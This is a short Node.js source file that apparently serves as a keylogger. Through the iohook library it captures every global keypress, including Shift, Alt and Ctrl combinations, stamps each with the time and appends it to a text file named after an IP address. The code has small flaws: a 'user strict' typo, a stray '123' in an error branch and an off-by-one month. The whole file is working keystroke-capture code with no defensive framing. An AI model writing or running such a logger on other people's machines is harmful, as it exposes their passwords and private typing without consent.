'user strict';
const fs = require('fs');
const ioHook = require("iohook")
const ipAddress = '127.0.0.1'

function to_time_standard_format(time) {
    return time.getFullYear() + "-" + time.getMonth() + "-" + time.getDate() + " " + time.getHours() + ":" + time.getMinutes() + ":" + time.getSeconds()
}

ioHook.on('keypress', function (event) {
    keyName = String.fromCharCode(event.keychar)
    if(event.keychar==13){
        keyName="Enter"
    }
    keyName = event.shiftKey ? "Shift+" + keyName : (event.altKey ? "Alt+" + keyName : (event.ctrlKey ? "Ctrl+" + keyName : keyName))
    currentTime = to_time_standard_format(new Date())
    data = "\"" + keyName + "\"" + "|" + currentTime + "\n"
    fs.appendFile(ipAddress + ".txt", data, (err) => {
        if (err) {123
            console.log("!!!" + err)
        } else {
            console.log("*** Pressed: " + data)
        }
    })
});

ioHook.start()